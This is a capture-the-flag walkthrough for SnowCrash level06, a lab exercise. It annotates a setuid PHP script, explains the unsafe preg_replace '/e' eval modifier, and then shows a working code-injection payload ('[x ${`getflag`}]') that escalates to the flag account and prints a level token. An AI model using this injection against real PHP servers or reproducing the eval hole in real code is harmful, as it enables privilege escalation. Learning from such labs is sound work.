# 1st Step  
List the file with `ls -l` will show us :  
```
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwsr-x---  1 flag06 level06 356  Mar 5   2015 level06.php
```  
***Notes** : The owner of 'level06' executable and 'level06.php' script is flag06 we'll probably exploit at least one of them*  
  
Look at the php script  
```
#!/usr/bin/php                                                            # Indicates the path of the interpreter, like for bash (#!/bin/bash)
<?php                                                                     # Opening php tag, this is the beginning of the script
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);                     # `/\./` matches the character '.' literally (case sensitive) => replace the first '.' by " x "
		$m = preg_replace("/@/", " y", $m);                       # `/@/` matches the character @ literally (case sensitive) => replace the first '@' by " y"
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);                               # `file_get_contents()` reads entire file and return it into a string
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);   # explanations bellow*
		$a = preg_replace("/\[/", "(", $a);                       # `/\[/` matches the character [ literally (case sensitive) => replace the first '[' by '('
		$a = preg_replace("/\]/", ")", $a);                       # `/\]/` matches the character ] literally (case sensitive) => replace the first ']' by ')'
		return $a;
	}
	$r = x($argv[1], $argv[2]);                                       # call the function x *the second line will print the result*
	print $r;
?>                                                                        # closing php tag, end of the script
```
  
It takes two parameters and calls a function x to get the content of the first parameter, assuming it refers to a file (see file_get_contents)  
Then replacements are done to this content, based on regular expressions.    
We can see the php script use the deprecated and vulnerable regex 'e' modifier
So the `/(\[x (.*)\])/e` regex will evaluate any string arranged in the form "[x (.*)]", interpret it as PHP code and call the 'y' function with ".*" as parameter.  
This allowing us to inject code like `getflag` ;)  

# 2nd Step
Let's exploit this php file !  
```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ su level07
Password: 
level07@SnowCrash:~$
```
*Note: we used the [complex syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) => ${function}*  
Level06 passed !
